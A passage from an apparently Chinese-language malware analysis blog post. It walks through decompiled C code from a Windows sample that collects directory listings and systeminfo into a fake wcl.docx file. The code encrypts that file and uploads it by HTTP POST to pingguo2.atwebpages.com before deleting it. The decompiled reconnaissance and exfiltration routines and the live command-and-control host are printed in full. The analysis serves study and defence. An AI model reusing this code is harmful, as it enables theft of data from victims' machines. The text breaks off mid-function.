class="number">0</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">GetShortPathNameA</span>(szLongPath, szShortPath, <span class="number">0x104</span>u);</span><br><span class="line">        <span class="built_in">wsprintfA</span>(v6, <span class="string">&quot;/c dir %s\\ &gt;&gt; %s&quot;</span>, szShortPath, FileName);</span><br><span class="line">        pExecInfo.lpParameters = v6;</span><br><span class="line">        <span class="built_in">ShellExecuteExA</span>(&amp;pExecInfo);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">3000u</span>);</span><br><span class="line">        <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="built_in">sizeof</span>(v1));              <span class="comment">// 执行/c dir C:\Users\ANONYM~1\AppData\Roaming\MICROS~1\Windows\Recent\ &gt;&gt; C:\Users\ANONYM~1\AppData\Roaming\MICROS~1\HNC\wcl.docx</span></span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">SHGetSpecialFolderPathA</span>(<span class="number">0</span>, v1, <span class="number">38</span>, <span class="number">0</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">GetShortPathNameA</span>(v1, szShortPath, <span class="number">0x104</span>u);</span><br><span class="line">          <span class="built_in">wsprintfA</span>(v6, <span class="string">&quot;/c dir %s\\ &gt;&gt; %s&quot;</span>, szShortPath, FileName);<span class="comment">// cmd /c是执行完命令之后关闭命令行窗口</span></span><br><span class="line">          pExecInfo.lpParameters = v6;</span><br><span class="line">          <span class="built_in">ShellExecuteExA</span>(&amp;pExecInfo);</span><br><span class="line">          <span class="built_in">Sleep</span>(<span class="number">3000u</span>);</span><br><span class="line">          <span class="built_in">wsprintfA</span>(v6, <span class="string">&quot;/c systeminfo &gt;&gt; %s&quot;</span>, FileName);<span class="comment">// /c systeminfo &gt;&gt; C:\Users\ANONYM~1\AppData\Roaming\MICROS~1\HNC\wcl.docx</span></span><br><span class="line">          pExecInfo.lpParameters = v6;</span><br><span class="line">          <span class="built_in">ShellExecuteExA</span>(&amp;pExecInfo);</span><br><span class="line">          <span class="built_in">Sleep</span>(<span class="number">0x1388</span>u);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>样本程序首先使用GetEnvironmentVariableA获取COMSPEC变量（也就是cmd.exe的文件路径），后面初始化使用shell需要的一些信息（例如文件路径、文件大小等参数）。再往下写入了三个shell，并且执行shell，作用是将宿主计算机信息存储在wcl.docx中：</p><p>&#x2F;c dir C:\Users\ANONYM<del>1\Desktop\ &gt;&gt; C:\Users\ANONYM</del>1\AppData\Roaming\MICROS~1\HNC\wcl.docx</p><p>&#x2F;c dir C:\Users\ANONYM<del>1\AppData\Roaming\MICROS</del>1\Windows\Recent\ &gt;&gt; C:\Users\ANONYM<del>1\AppData\Roaming\MICROS</del>1\HNC\wcl.docx</p><p>&#x2F;c dir C:\PROGRA<del>2\ &gt;&gt; C:\Users\ANONYM</del>1\AppData\Roaming\MICROS~1\HNC\wcl.docx</p><p>&#x2F;c systeminfo &gt;&gt; C:\Users\ANONYM<del>1\AppData\Roaming\MICROS</del>1\HNC\wcl.docx</p><p>解释一下&#x2F;c的意思是cmd打开命令行执行完命令之后直接退出，也就是命令执行的时候是不会进行弹出控制台程序的。</p><p>执行&#x2F;c dir C:\Users\ANONYM<del>1\Desktop\ &gt;&gt; C:\Users\ANONYM</del>1\AppData\Roaming\MICROS~1\HNC\wcl.docx</p><p><img src="https://s2.loli.net/2022/10/19/1lY7RKFOtAncsWx.png" alt="image-20221017190516411.png"></p><p>执行&#x2F;c dir C:\Users\ANONYM<del>1\AppData\Roaming\MICROS</del>1\Windows\Recent\ &gt;&gt; C:\Users\ANONYM<del>1\AppData\Roaming\MICROS</del>1\HNC\wcl.docx</p><p><img src="https://s2.loli.net/2022/10/19/Wnv9qAUbXTgczFD.png" alt="image-20221017192133928"></p><p>执行&#x2F;c dir C:\PROGRA<del>2\ &gt;&gt; C:\Users\ANONYM</del>1\AppData\Roaming\MICROS~1\HNC\wcl.docx</p><p><img src="https://s2.loli.net/2022/10/19/LWKlYSUiTxmo9FM.png" alt="image-20221017192548769.png"></p><p>执行&#x2F;c systeminfo &gt;&gt; C:\Users\ANONYM<del>1\AppData\Roaming\MICROS</del>1\HNC\wcl.docx</p><p><img src="https://s2.loli.net/2022/10/19/WwKVjofz2TXUJPq.png" alt="image-20221017192952195.png"></p><p>打开生成的文件发现文件中存储着计算机的信息。</p><p><img src="https://s2.loli.net/2022/10/19/LIQHzWpsNrVvlRh.png" alt="image-20221017203516420.png"></p><h4 id="sub-4049E0"><a href="#sub-4049E0" class="headerlink" title="sub_4049E0()"></a>sub_4049E0()</h4><p>这个函数用来构造网络请求，其程序逻辑如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">sub_4049E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// eax</span></span><br><span class="line">  FILE *v1; <span class="comment">// ebx</span></span><br><span class="line">  BOOL result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v6; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">size_t</span> v7; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">size_t</span> v11; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v12; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v13; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">size_t</span> v14; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v15; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">char</span> v16; <span class="comment">// al</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v17; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">char</span> v18[<span class="number">260</span>]; <span class="comment">// [esp+4h] [ebp-138h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v19[<span class="number">25</span>]; <span class="comment">// [esp+108h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v20; <span class="comment">// [esp+121h] [ebp-1Bh]</span></span><br><span class="line">  __int16 v21; <span class="comment">// [esp+125h] [ebp-17h]</span></span><br><span class="line">  <span class="type">char</span> v22; <span class="comment">// [esp+127h] [ebp-15h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v23; <span class="comment">// [esp+128h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v24; <span class="comment">// [esp+12Ch] [ebp-10h]</span></span><br><span class="line">  <span class="type">size_t</span> Size; <span class="comment">// [esp+130h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *Src; <span class="comment">// [esp+134h] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> Value; <span class="comment">// [esp+138h] [ebp-4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">fopen</span>(FileName, <span class="string">&quot;rb&quot;</span>);                   <span class="comment">// C:\Users\ANONYM~1\AppData\Roaming\MICROS~1\HNC\wcl.docx</span></span><br><span class="line">  v1 = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = _fileno(v0);</span><br><span class="line">    v4 = _filelength(v3);</span><br><span class="line">    Value = v4;</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = v4 + <span class="number">1</span>;</span><br><span class="line">      v6 = <span class="built_in">unknown_libname_1</span>(v4 + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memset</span>(v6, <span class="number">0</span>, v5);</span><br><span class="line">      <span class="built_in">fread</span>(v6, <span class="number">1u</span>, Value, v1);                 <span class="comment">// 读文件</span></span><br><span class="line">      <span class="built_in">fclose</span>(v1);</span><br><span class="line">      v7 = Value + <span class="number">5</span>;</span><br><span class="line">      v23 = Value + <span class="number">4</span>;</span><br><span class="line">      Value = <span class="built_in">unknown_libname_1</span>(Value + <span class="number">5</span>);</span><br><span class="line">      <span class="built_in">memset</span>(Value, <span class="number">0</span>, v7);</span><br><span class="line">      *&amp;v19[<span class="number">17</span>] = <span class="number">0</span>i64;</span><br><span class="line">      v20 = <span class="number">0</span>;</span><br><span class="line">      v21 = <span class="number">0</span>;</span><br><span class="line">      v22 = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">strcpy</span>(v19, <span class="string">&quot;01234567abcdefgh&quot;</span>);</span><br><span class="line">      <span class="built_in">sub_404020</span>(Value, v19);                   <span class="comment">// 加密或者操作</span></span><br><span class="line">      <span class="built_in">j_j_j___free_base</span>(v6);</span><br><span class="line">      v8 = <span class="built_in">unknown_libname_1</span>(<span class="number">0x100001</span>u);</span><br><span class="line">      Src = v8;</span><br><span class="line">      v9 = <span class="built_in">unknown_libname_1</span>(<span class="number">0x206590</span>u);</span><br><span class="line">      v10 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">0x64</span>u);</span><br><span class="line">        <span class="built_in">memset</span>(v9, <span class="number">0</span>, <span class="number">0x200514</span>u);</span><br><span class="line">        <span class="built_in">memset</span>(v8, <span class="number">0</span>, <span class="number">0x100001</span>u);</span><br><span class="line">        v11 = <span class="number">0x100000</span>;</span><br><span class="line">        Size = <span class="number">0x100000</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v23 - v10 &lt; <span class="number">0x100000</span> &amp;&amp; (v11 = v23 - v10, Size = v23 - v10, v23 == v10) )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = v10 + <span class="number">9</span>;</span><br><span class="line">          <span class="built_in">strcat</span>(Src, <span class="string">&quot;ending&quot;</span>);</span><br><span class="line">          Size = <span class="number">6</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memmove_0</span>(Src, (v10 + Value), v11);</span><br><span class="line">          v12 = v11 + v10;</span><br><span class="line">        &#125;</span><br><span class="line">        v24 = v12;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1u</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(v9, <span class="string">&quot;\r\n------WebKitFormBoundarywhpFxMBe19cSjFnG&quot;</span>);<span class="comment">// 构造网络请求</span></span><br><span class="line">        <span class="built_in">strcat</span>(v9, <span class="string">&quot;\r\nContent-Disposition: form-data; name=\&quot;MAX_FILE_SIZE\&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(v9, <span class="string">&quot;\r\n\r\n10000000&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(v9, <span class="string">&quot;\r\n------WebKitFormBoundarywhpFxMBe19cSjFnG&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(v9, <span class="string">&quot;\r\nContent-Disposition: form-data; name=\&quot;userfile\&quot;; filename=\&quot;&quot;</span>);</span><br><span class="line">        <span class="built_in">strcat</span>(v9, <span class="string">&quot;button01&quot;</span>);</span><br><span class="line">        *&amp;v9[<span class="built_in">strlen</span>(v9)] = <span class="number">34</span>;</span><br><span class="line">        <span class="built_in">strcat</span>(v9, <span class="string">&quot;\r\nContent-Type: application/octet-stream\r\n\r\n&quot;</span>);</span><br><span class="line">        v13 = <span class="built_in">strlen</span>(v9);</span><br><span class="line">        v14 = Size;</span><br><span class="line">        <span class="built_in">memmove_0</span>(&amp;v9[v13], Src, Size);</span><br><span class="line">        <span class="built_in">strcpy</span>(v18, <span class="string">&quot;\r\n------WebKitFormBoundarywhpFxMBe19cSjFnG&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(&amp;v18[<span class="number">43</span>], <span class="number">0</span>, <span class="number">0xD9</span>u);</span><br><span class="line">        v15 = <span class="string">&quot;\r\n------WebKitFormBoundarywhpFxMBe19cSjFnG&quot;</span>;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v16 = *v15++;</span><br><span class="line">          v9[v14 - <span class="number">1</span> + v13 - <span class="string">&quot;\r\n------WebKitFormBoundarywhpFxMBe19cSjFnG&quot;</span> + v15] = v16;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v16 );</span><br><span class="line">        v17 = <span class="built_in">strlen</span>(v18);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="built_in">sub_404DD0</span>(v9, Size + v17 + v13) == <span class="number">1</span> )<span class="comment">// POST函数</span></span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v10 = v24;</span><br><span class="line">        <span class="keyword">if</span> ( v24 &gt; v23 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        v8 = Src;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">DeleteFileA</span>(FileName);</span><br><span class="line">      <span class="built_in">GetLastError</span>();</span><br><span class="line">      <span class="built_in">j_j_j___free_base</span>(v9);</span><br><span class="line">      <span class="built_in">j_j_j___free_base</span>(Src);</span><br><span class="line">      <span class="built_in">j_j_j___free_base</span>(Value);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">DeleteFileA</span>(FileName);</span><br><span class="line">      result = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    Value = <span class="number">0</span>;</span><br><span class="line">    _get_errno(&amp;Value);</span><br><span class="line">    result = Value == <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序先打开了之前从生成的docx文件，后面使用了一串加密操作的代码或者函数，我也没具体分析，读入word之后传递给v9然后进行拼接了网络请求，最后将文件删除</p><p><img src="https://s2.loli.net/2022/10/19/QYckrdaumFR8wOq.png" alt="image-20221017195305360.png"></p><p>构造网络请求</p><p><img src="https://s2.loli.net/2022/10/19/uHsVFDdjflMC5nW.png" alt="image-20221017200858118.png"></p><p>这个函数内还有一个函数sub_404DD0主要用来执行POST请求，发送的信息就是a1（相当于上一层函数里v9用来存储读入的信息）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_404DD0</span><span class="params">(<span class="type">void</span> *a1, DWORD a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  LPCSTR lpszAcceptTypes[<span class="number">2</span>]; <span class="comment">// [esp+4h] [ebp-52Ch] BYREF</span></span><br><span class="line">  HINTERNET hInternet; <span class="comment">// [esp+Ch] [ebp-524h]</span></span><br><span class="line">  LPVOID lpOptional; <span class="comment">// [esp+10h] [ebp-520h]</span></span><br><span class="line">  DWORD dwOptionalLength; <span class="comment">// [esp+14h] [ebp-51Ch]</span></span><br><span class="line">  CHAR szHeaders[<span class="number">1000</span>]; <span class="comment">// [esp+18h] [ebp-518h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">24</span>]; <span class="comment">// [esp+400h] [ebp-130h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v13[<span class="number">76</span>]; <span class="comment">// [esp+418h] [ebp-118h] BYREF</span></span><br><span class="line">  CHAR szAgent[<span class="number">84</span>]; <span class="comment">// [esp+464h] [ebp-CCh] BYREF</span></span><br><span class="line">  __int128 v15; <span class="comment">// [esp+4B8h] [ebp-78h]</span></span><br><span class="line">  <span class="type">char</span> v16[<span class="number">84</span>]; <span class="comment">// [esp+4C8h] [ebp-68h] BYREF</span></span><br><span class="line">  __int128 v17; <span class="comment">// [esp+51Ch] [ebp-14h]</span></span><br><span class="line"></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  dwOptionalLength = a2;</span><br><span class="line">  lpOptional = a1;</span><br><span class="line">  <span class="built_in">memset</span>(szHeaders, <span class="number">0</span>, <span class="built_in">sizeof</span>(szHeaders));</span><br><span class="line">  <span class="built_in">strcpy</span>(v16, <span class="string">&quot;Content-Type: multipart/form-data; boundary=----WebKitFormBoundarywhpFxMBe19cSjFnG&quot;</span>);</span><br><span class="line">  v17 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Accept-Language: en-us&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(v13, <span class="number">0</span>, <span class="built_in">sizeof</span>(v13));</span><br><span class="line">  <span class="built_in">strcpy</span>(szAgent, <span class="string">&quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; .NET CLR 1.1.4322)&quot;</span>);</span><br><span class="line">  lpszAcceptTypes[<span class="number">0</span>] = <span class="string">&quot;*/*&quot;</span>;</span><br><span class="line">  lpszAcceptTypes[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">wsprintfA</span>(</span><br><span class="line">    szHeaders,</span><br><span class="line">    <span class="string">&quot;Host: %s\r\nReferer: http://%s%s\r\n%s\r\n%s&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pingguo2.atwebpages.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pingguo2.atwebpages.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;home/jpg/post.php&quot;</span>,</span><br><span class="line">    v16,</span><br><span class="line">    v12);</span><br><span class="line">  v3 = <span class="built_in">InternetOpenA</span>(szAgent, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  hInternet = v3;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">InternetConnectA</span>(v3, <span class="string">&quot;pingguo2.atwebpages.com&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3u</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = <span class="built_in">HttpOpenRequestA</span>(v4, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;home/jpg/post.php&quot;</span>, <span class="string">&quot;HTTP/1.0&quot;</span>, <span class="number">0</span>, lpszAcceptTypes, <span class="number">0x84400000</span>, <span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">HttpSendRequestA</span>(v5, szHeaders, <span class="built_in">strlen</span>(szHeaders), lpOptional, dwOptionalLength) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">GetLastError</span>();</span><br><span class="line">          v2 = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">InternetCloseHandle</span>(v5);</span><br><span class="line">        <span class="built_in">InternetCloseHandle</span>(v4);</span><br><span class="line">        <span class="built_in">InternetCloseHandle</span>(hInternet);</span><br><span class="line">        result = v2;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="built_in">InternetCloseHandle</span>(v4);</span><br><span class="line">        <span class="built_in">InternetCloseHandle</span>(hInternet);</span><br><span class="line">        result = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">GetLastError</span>();</span><br><span class="line">      <span class="built_in">InternetCloseHandle</span>(hInternet);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">GetLastError</span>();</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="sub-4045C0"><a href="#sub-4045C0" class="headerlink" title="sub_4045C0()"></a>sub_4045C0()</h4><p>这部分函数发送HTTP请求，代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">sub_4045C0</span><span 